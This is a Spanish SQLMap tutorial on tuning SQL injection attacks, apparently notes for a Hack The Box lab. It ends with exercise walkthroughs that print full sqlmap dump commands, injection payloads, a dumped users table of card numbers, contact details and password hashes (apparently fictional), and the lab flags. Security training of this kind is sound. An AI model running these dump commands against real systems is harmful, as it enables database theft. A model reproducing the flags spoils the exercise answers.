
# SQLMap - Ajuste del ataque

En la mayoría de los casos, SQLMap debería ejecutarse de inmediato con los detalles del objetivo proporcionados. Sin embargo, existen opciones para ajustar los intentos de inyección de SQLi para ayudar a SQLMap en la fase de detección. Cada carga útil enviada al objetivo consta de:

* Vector (por ejemplo, `UNION ALL SELECT 1,2,VERSION()`): parte central del payload, que lleva el código SQL útil que se ejecutará en el destino.
* Límites (por ejemplo `'<vector>-- -`): formaciones de prefijo y sufijo, utilizadas para la inyección adecuada del vector en la declaración SQL vulnerable.

***

## <mark style="color:purple;">Prefijo/Sufijo</mark>

En casos excepcionales, no contemplados por la ejecución normal de SQLMap, se requieren valores de prefijo y sufijo especiales. Para dichas ejecuciones, se pueden utilizar las opciones `--prefix` y `--suffix` de la siguiente manera:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Esto dará como resultado un encierro de todos los valores vectoriales entre el prefijo estático `%'))`y el sufijo `-- -`. Por ejemplo, si el código vulnerable en el objetivo es:

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

El vector `UNION ALL SELECT 1,2,VERSION()`, delimitado por el prefijo `%'))`y el sufijo `-- -`, dará como resultado la siguiente declaración SQL (válida) en el destino:

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

***

## <mark style="color:purple;">Nivel/Riesgo</mark>

De forma predeterminada, SQLMap combina un conjunto predefinido de límites más comunes (es decir, pares de prefijo/sufijo), junto con los vectores que tienen una alta probabilidad de éxito en caso de un objetivo vulnerable. Sin embargo, existe la posibilidad de que los usuarios utilicen conjuntos más grandes de límites y vectores, ya incorporados en SQLMap.

Para tales casos se deberán utilizar las opciones `--level` y `--risk`:

* La opción `--level`( `1-5`, predeterminada `1`) extiende tanto los vectores como los límites que se utilizan, en función de su expectativa de éxito (es decir, cuanto menor sea la expectativa, mayor será el nivel).
* La opción `--risk`( `1-3`, predeterminada `1`) extiende el conjunto de vectores usado en función de su riesgo de causar problemas en el lado de destino (es decir, riesgo de pérdida de entrada de base de datos o denegación de servicio).

La mejor manera de comprobar las diferencias entre los límites y los payloads utilizados para diferentes valores de `--level` y `--risk` es el uso de la opción `-v` para establecer el nivel de verbosidad. En el nivel de verbosidad 3 o superior (por ejemplo, `-v 3`), se mostrarán los mensajes que contienen el `[PAYLOAD]`  , de la siguiente manera:

```shell-session
afsh4ck@hkali$ sqlmap -u www.example.com/?id=1 -v 3 --level=5

...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

Por otro lado, los payloads utilizados con el valor `--level` predeterminado tienen un conjunto de límites considerablemente más pequeño:

```shell-session
afsh4ck@kali$ sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

En cuanto a los vectores, podemos comparar los payloads utilizados de la siguiente manera:

```shell-session
afsh4ck@kali$ sqlmap -u www.example.com/?id=1
...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...
```

```shell-session
afsh4ck@kali$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3

...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...
```

En cuanto al número de payloads, de forma predeterminada (es decir, `--level=1 --risk=1`), el número de payloads utilizados para probar un solo parámetro sube hasta `72`, mientras que en el caso más detallado ( `--level=5 --risk=3`) el número de payloads aumenta a `7.865`.

Como SQLMap ya está configurado para comprobar los límites y vectores más comunes, se recomienda a los usuarios habituales no tocar estas opciones porque harán que todo el proceso de detección sea considerablemente más lento. Sin embargo, en casos especiales de vulnerabilidades de SQLi, donde el uso de payloads `OR` es obligatorio (por ejemplo, en el caso de las páginas de `login`), es posible que tengamos que aumentar el nivel de riesgo nosotros mismos.

Esto se debe a que los payloads `OR` son inherentemente peligrosas en una ejecución predeterminada, donde las declaraciones SQL vulnerables subyacentes (aunque con menos frecuencia) modifican activamente el contenido de la base de datos (por ejemplo, `DELETE`o `UPDATE`).

***

## <mark style="color:purple;">Ajuste avanzado</mark>

Para afinar aún más el mecanismo de detección, hay un conjunto considerable de opciones y parámetros. En casos normales, SQLMap no requerirá su uso. Aun así, debemos familiarizarnos con ellos para poder usarlos cuando sea necesario.

### **Códigos de estado**

Por ejemplo, cuando se trata de una respuesta de objetivo enorme con mucho contenido dinámico, se podrían utilizar diferencias sutiles entre las respuestas `TRUE` y `FALSE` con fines de detección. Si la diferencia entre respuestas `TRUE` y `FALSE` se puede ver en los códigos HTTP (por ejemplo, 200 para `TRUE` y 500 para `FALSE`), la opción --code podría usarse para fijar la detección de respuestas `TRUE` a un código HTTP específico (por ejemplo, -- código = 200).

### **Title**

Si la diferencia entre las respuestas se puede ver inspeccionando los títulos de las páginas HTTP, el interruptor `--titles` podría usarse para indicar al mecanismo de detección que base la comparación en el contenido de la etiqueta HTML `<title>`.

### **Strings**

En caso de que un valor de cadena específico aparezca en las respuestas `TRUE` (por ejemplo, `success`), pero esté ausente en las respuestas, se podría usar la opción `FALSE` para fijar la detección basándose únicamente en la aparición de ese único valor (por ejemplo , ).`--string--string=success`

### **Text-only**

Cuando trabajamos con mucho contenido oculto, como ciertas etiquetas de comportamiento de páginas HTML (por ejemplo `<script>`, `<style>`, , `<meta>`, etc.), podemos usar la flag `--text-only`, que elimina todas las etiquetas HTML y basa la comparación solo en el contenido textual (es decir, visible).

### **Técnicas**

En algunos casos especiales, tenemos que limitar los payloads utilizados a un tipo determinado. Por ejemplo, si las cargas útiles ciegas basadas en el tiempo están causando problemas en forma de tiempos de espera de respuesta, o si queremos forzar el uso de un tipo específico de payload SQLi, la opción `--technique` puede especificar la técnica SQLi que se utilizará.

Por ejemplo, si queremos omitir los payloads SQLi ciegas basadas en tiempo y de apilamiento y solo probar los payloads ciegas basadas en booleanos, basadas en errores y de consulta UNION, podemos especificar estas técnicas con `--technique=BEU`.

### **Ajuste de SQLi de UNION**

En algunos casos, los payloads de SQLi `UNION` requieren información adicional proporcionada por el usuario para funcionar. Si podemos encontrar manualmente el número exacto de columnas de la consulta SQL vulnerable, podemos proporcionar este número a SQLMap con la opción `--union-cols`(por ejemplo `--union-cols=17`, ). En caso de que los valores de relleno "ficticios" predeterminados utilizados por SQLMap ( `NULL`y el entero aleatorio) no sean compatibles con los valores de los resultados de la consulta SQL vulnerable, podemos especificar un valor alternativo en su lugar (por ejemplo, `--union-char='a'`).

Además, en caso de que exista un requisito para utilizar un apéndice al final de una consulta `UNION` en forma de `FROM <table>`(por ejemplo, en el caso de Oracle), podemos configurarlo con la opción `--union-from`(por ejemplo `--union-from=users`). El hecho de no utilizar el apéndice `FROM` correcto de forma automática podría deberse a la incapacidad de detectar el nombre del DBMS antes de su uso.

***

## <mark style="color:purple;">Ejercicio</mark>

```
Objetivo: 83.136.255.149:48069
```

<figure><img src="/files/OJN6BJiUaC0YBrq3YKwk" alt=""><figcaption></figcaption></figure>

### Pregunta 1

¿Cuál es el contenido de la tabla flag5? (Caso n.° 5)

<figure><img src="/files/aduomi8Lg5vmIvoTTg3b" alt=""><figcaption></figcaption></figure>

Si ejecutamos un escaneo normal con sqlmap no obtenemos ningún resultado, por lo que tenemos que aumentar el `--level` y `--risk`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ sqlmap -u 'http://94.237.51.88:58192/case5.php?id=1' --dump --batch --level=5 --risk=3
</strong>        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:24:54 /2024-08-09/

[14:24:54] [INFO] testing connection to the target URL
[14:24:54] [INFO] testing if the target URL content is stable
[14:24:55] [INFO] target URL content is stable
[14:24:55] [INFO] testing if GET parameter 'id' is dynamic
[14:24:55] [INFO] GET parameter 'id' appears to be dynamic
[14:24:55] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[14:24:55] [INFO] testing for SQL injection on GET parameter 'id'
[14:24:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:25:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:25:44] [INFO] fetching current database
[14:25:44] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[14:53:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:53:31] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:53:31] [INFO] fetching current database
[14:53:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[14:53:31] [INFO] retrieved: testdb
[14:53:33] [INFO] fetching tables for database: 'testdb'
[14:53:33] [INFO] fetching number of tables for database 'testdb'
[14:53:33] [INFO] retrieved: 2
[14:53:33] [INFO] retrieved: users
[14:53:35] [INFO] retrieved: flag5
[14:53:39] [INFO] fetching columns for table 'flag5' in database 'testdb'
[14:53:39] [INFO] retrieved: 2
[14:53:40] [INFO] retrieved: id
[14:53:41] [INFO] retrieved: content
[14:53:44] [INFO] fetching entries for table 'flag5' in database 'testdb'
[14:53:44] [INFO] fetching number of entries for table 'flag5' in database 'testdb'
[14:53:44] [INFO] retrieved: 1
[14:53:44] [INFO] retrieved: HTB{700_much_r15k_bu7_w0r7h_17}
[14:53:58] [INFO] retrieved: 1
Database: testdb
Table: flag5
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
+----+---------------------------------+
</code></pre>

### Pregunta 2

¿Cuál es el contenido de la tabla flag6? (Caso n.° 6)

<figure><img src="/files/LFPagCTPotQev6dxrZbM" alt=""><figcaption></figcaption></figure>

```shell-session
afsh4ck@kali$ sqlmap http://94.237.51.88:58192/case6.php\?col\=id --random-agent --batch --dump --prefix='`)' --level=5 --risk=3
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:35:12 /2024-08-09/

[15:35:12] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1b1) Gecko/20060707 Firefox/2.0b1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[15:35:12] [INFO] testing connection to the target URL
[15:35:12] [INFO] testing if the target URL content is stable
[15:35:13] [INFO] target URL content is stable
[15:35:13] [INFO] testing if GET parameter 'col' is dynamic
[15:35:13] [INFO] GET parameter 'col' appears to be dynamic
[15:35:13] [INFO] heuristic (basic) test shows that GET parameter 'col' might be injectable (possible DBMS: 'MySQL')
[15:35:13] [INFO] heuristic (XSS) test shows that GET parameter 'col' might be vulnerable to cross-site scripting (XSS) attacks
[15:36:16] [INFO] target URL appears to have 6 columns in query
[15:36:16] [INFO] GET parameter 'col' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'col' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:
---
Parameter: col (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: col=id`) AND 3210=3210-- MZUh

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: col=id`) AND 3170=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- ftRc

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: col=id`) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b7a6b71,0x44636f6a4b6d596757724a6b6c5147674470706d4f7142487a69695866666d456e664e4642735670,0x7176787a71),NULL-- -
---
[15:36:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
[15:36:16] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:36:16] [INFO] fetching current database
[15:36:16] [INFO] fetching tables for database: 'testdb'
[15:36:17] [INFO] fetching columns for table 'flag6' in database 'testdb'
[15:36:17] [INFO] fetching entries for table 'flag6' in database 'testdb'
Database: testdb
Table: flag6
[1 entry]
+----+----------------------------------+
| id | content                          |
+----+----------------------------------+
| 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
+----+----------------------------------+
```

### Pregunta 3

¿Cuál es el contenido de la tabla flag7? (Caso n.° 7)

<figure><img src="/files/9BuUpQFtv9yRiYb7gKHV" alt=""><figcaption></figcaption></figure>

```
sqlmap -u 'http://94.237.51.88:58192/case7.php?id=1' --union-cols=5 --dump --no-cast                                                 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:48:58 /2024-08-09/

[15:48:58] [INFO] testing connection to the target URL
[15:48:59] [INFO] testing if the target URL content is stable
[15:48:59] [INFO] target URL content is stable
[15:48:59] [INFO] testing if GET parameter 'id' is dynamic
[15:48:59] [INFO] GET parameter 'id' appears to be dynamic
[15:48:59] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[15:49:14] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 5 to 5 columns (custom)' injectable
[15:49:14] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 115 HTTP(s) requests:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns (custom)
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(CONCAT('qvqjq','IgAZIEQMZUCEUMShHVdPUqpmZDpytWlVqPtSBUMs'),'qvbkq'),NULL,NULL,NULL-- CAhi
---
[15:49:24] [INFO] testing MySQL
[15:49:24] [INFO] confirming MySQL
[15:49:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[15:49:24] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:49:24] [INFO] fetching current database
[15:49:24] [INFO] fetching tables for database: 'testdb'
[15:49:25] [INFO] fetching columns for table 'users' in database 'testdb'
[15:49:25] [INFO] fetching entries for table 'users' in database 'testdb'
[15:49:25] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[15:49:32] [INFO] writing hashes to a temporary file '/tmp/sqlmapnxvb5wd6429823/sqlmaphashes-mrrs7tmv.txt' 
n
Database: testdb
Table: users
[32 entries]
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+------------------------------------------+---------------------------------------------------+
| id | cc               | email                       | phone        | name              | address                | birthday          | password                                 | occupation                                        |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | MaynardMRice@yahoo.com      | 281-559-0172 | Maynard Rice      | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 | Linemen                                           |
| 2  | 4539475107874477 | JulioWThomas@gmail.com      | 973-426-5961 | Julio Thomas      | 1207 Granville Lane    | February 14 1972  | 10946aa229a6d569f226976b22ea0e900a1fc219 | Agricultural product sorter                       |
| 3  | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 | General and operations manager                    |
| 4  | 4929811432072262 | GregoryBStumbaugh@yahoo.com | 410-680-5653 | Gregory Stumbaugh | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e | Foreign language interpreter                      |
| 5  | 4539646911423277 | BobbyJGranger@gmail.com     | 212-696-1812 | Bobby Granger     | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 | Medical records and health information technician |
| 6  | 5143241665092174 | KimberlyMWright@gmail.com   | 440-232-3739 | Kimberly Wright   | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 | Electrologist                                     |
| 7  | 5503989023993848 | DeanLHarper@yahoo.com       | 440-847-8376 | Dean Harper       | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 | Store detective                                   |
| 8  | 4556586478396094 | GabrielaRWaite@msn.com      | 732-638-1529 | Gabriela Waite    | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b | Telephone station installer                       |
| 9  | 5452466713512742 | RoySCarr@msn.com            | 408-848-6272 | Roy Carr          | 1384 Sycamore Street   | October 19 1942   | 9987f0c165bc62eb3ee3db17967fbb81c026c197 | Freight, stock, and material mover                |
| 10 | 5231550277906388 | AlfonzoGWilliams@gmail.com  | 740-546-1581 | Alfonzo Williams  | 911 Irving Road        | July 16 1931      | c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b | Outside order clerk                               |
| 11 | 5224197138746170 | ChristopherHBrown@yahoo.com | 917-840-2535 | Christopher Brown | 2246 Settlers Lane     | March 29 1951     | 608e6d07cc8ce20bfdaf9c72ef420ad691de32cb | Unlicensed assistive personnel                    |
| 12 | 4485150912665782 | AudreyRHill@gmail.com       | 717-308-3644 | Audrey Hill       | 2306 Stout Street      | July 19 1969      | 8203b1bf12aba49d7566ff7007b60d1c0a439bee | Mail processor                                    |
| 13 | 4716071391111521 | RyanMSpencer@msn.com        | 256-441-1530 | Ryan Spencer      | 4309 Turnpike Drive    | July 3 1979       | ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74 | Claims representative                             |
| 14 | 4716242999773281 | JessieJSchwan@yahoo.com     | 989-217-2111 | Jessie Schwan     | 1285 Wood Street       | October 28 1937   | 520df62660b18e571c7cb3b5d3f559b8a8ff0d4b | Network and computer systems administrator        |
| 15 | 5183997232057997 | ShannonRStewart@yahoo.com   | 828-850-2133 | Shannon Stewart   | 1596 Watson Lane       | May 28 1934       | 2e0488a09433aa0d67b3463c76f407c7b0388ad7 | Sketch artist                                     |
| 16 | 4556164708532886 | MarkLStilwell@msn.com       | 715-392-4649 | Mark Stilwell     | 121 Abner Road         | September 1 1950  | 21549a28300f72442b132d06d4016de606f36627 | Occupational therapist assistant                  |
| 17 | 4485731897297327 | AnnetteDGill@yahoo.com      | 216-376-3062 | Annette Gill      | 4999 Glenwood Avenue   | August 19 1977    | 0ff476c2676a2e5f172fe568110552f2e910c917 | Plate finisher                                    |
| 18 | 4485934311754598 | CyndiBReyes@gmail.com       | 903-679-2061 | Cyndi Reyes       | 4347 Hall Place        | June 5 1947       | 15ce1871a907e8265f00defa21a723e7a4d35267 | Executive                                         |
| 19 | 5217064909950341 | WilliamDMunoz@gmail.com     | 323-789-6686 | William Munoz     | 2961 Hillhaven Drive   | July 4 1928       | df692aa944eb45737f0b3b3ef906f8372a3834e9 | Service station attendant                         |
| 20 | 4929461176669103 | ScottBPonce@yahoo.com       | 626-537-0602 | Scott Ponce       | 3023 Woodstock Drive   | September 19 1947 | 20021ffbd3be7a3cddc64812d5dd6e5afb6e760c | Benefits manager                                  |
| 21 | 4916977560623393 | PhilipTAhearn@gmail.com     | 509-327-6685 | Philip Ahearn     | 4418 Goodwin Avenue    | May 22 1938       | 3d8f48ab8e119dd813a449f6bfcf42abae63567b | Office assistant                                  |
| 22 | 5480619405065199 | MyraJStephenson@yahoo.com   | 717-770-6897 | Myra Stephenson   | 4225 Aaron Smith Drive | December 25 1966  | 41244ab550c182b3ebe2dce87065bf363d0e013e | Animator                                          |
| 23 | 4532761682899246 | MarianCJoiner@yahoo.com     | 707-467-5061 | Marian Joiner     | 273 Fairway Drive      | February 12 1978  | 5635e59941510dc473fbeed046c43007f76cfe03 | Foundry mold and coremaker                        |
| 24 | 5357620822740711 | LloydSLiu@gmail.com         | 616-396-4287 | Lloyd Liu         | 3277 Howard Street     | August 18 1951    | 09422b94c8f031285b22500c2d0a68bb8ec4dc70 | Sound engineering technician                      |
| 25 | 5219707450752213 | JoshuaEFletcher@gmail.com   | 317-670-8864 | Joshua Fletcher   | 1510 Stewart Street    | August 14 1934    | 65b136cb1ec4b88f709f8f510262720eddfa71a7 | Edition binding worker                            |
| 26 | 4485684355495794 | MargaretNBooker@msn.com     | 760-969-7147 | Margaret Booker   | 70 Wilson Street       | December 17 1975  | 4282cfe7697817374251bc17aa47de6f620586b5 | Management information systems director           |
| 27 | 5134210174158363 | FrancisMArroyo@yahoo.com    | 951-252-9692 | Francis Arroyo    | 3600 Hillcrest Lane    | July 6 1993       | f2d897eb3bae0f1fd396325deb3c4779ae1d586d | Gastroenterology nurse                            |
| 28 | 4485114901308234 | AngelJMarquez@gmail.com     | 209-874-4743 | Angel Marquez     | 1144 Richards Avenue   | May 14 1966       | 4bf1926f7bb7ae283e1390236fd4a8737209862e | Echocardiographer                                 |
| 29 | 4532210842993911 | PamelaJRock@yahoo.com       | 715-454-8565 | Pamela Rock       | 3110 Abner Road        | October 31 1992   | c7fbcdaf308cdcd64504d46342e7c79959388c44 | Private investigator                              |
| 30 | 4556109704569770 | DennisDSnow@yahoo.com       | 715-730-1951 | Dennis Snow       | 4211 Tea Berry Lane    | November 10 1938  | 6725c7bee76ccdb7eda15fa263908988115498a9 | Unlicensed assistive personnel                    |
| 31 | 5554945940459873 | LorenSBunch@gmail.com       | 805-766-2963 | Loren Bunch       | 3111 Par Drive         | October 22 1971   | 70f361f8a1c9035a1d972a209ec5e8b726d1055e | Cafeteria cook                                    |
| 32 | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | c6970ba1130b4bbca5be99f0ce00a706f256c818 | General and operations manager                    |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+------------------------------------------+---------------------------------------------------+

[15:49:37] [INFO] table 'testdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/94.237.51.88/dump/testdb/users.csv'
[15:49:37] [INFO] fetching columns for table 'flag7' in database 'testdb'
[15:49:37] [INFO] fetching entries for table 'flag7' in database 'testdb'
Database: testdb
Table: flag7
[1 entry]
+----+-----------------------+
| id | content               |
+----+-----------------------+
| 1  | HTB{un173_7h3_un173d} |
+----+-----------------------+
```
